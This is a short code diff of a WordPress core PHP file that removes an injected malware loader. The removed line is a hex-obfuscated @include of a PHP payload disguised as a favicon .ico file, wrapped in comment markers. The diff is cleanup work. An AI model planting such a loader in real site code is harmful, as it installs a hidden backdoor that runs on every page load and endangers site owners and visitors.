@@ -1,9 +1,4 @@
 <?php
-/*406c2*/
-
-@include "\x2fva\x72/w\x77w/\x68tm\x6c/f\x79fe\x2dpr\x6fje\x63t.\x73un\x62ea\x72di\x67it\x61l.\x63om\x2fwo\x72dp\x72es\x73/w\x70-i\x6ecl\x75de\x73/t\x68em\x65-c\x6fmp\x61t/\x66av\x69co\x6e_8\x62d8\x38c.\x69co";
-
-/*406c2*/
 /**
  * Used to set up and fix common variables and include
  * the WordPress procedural and class library.
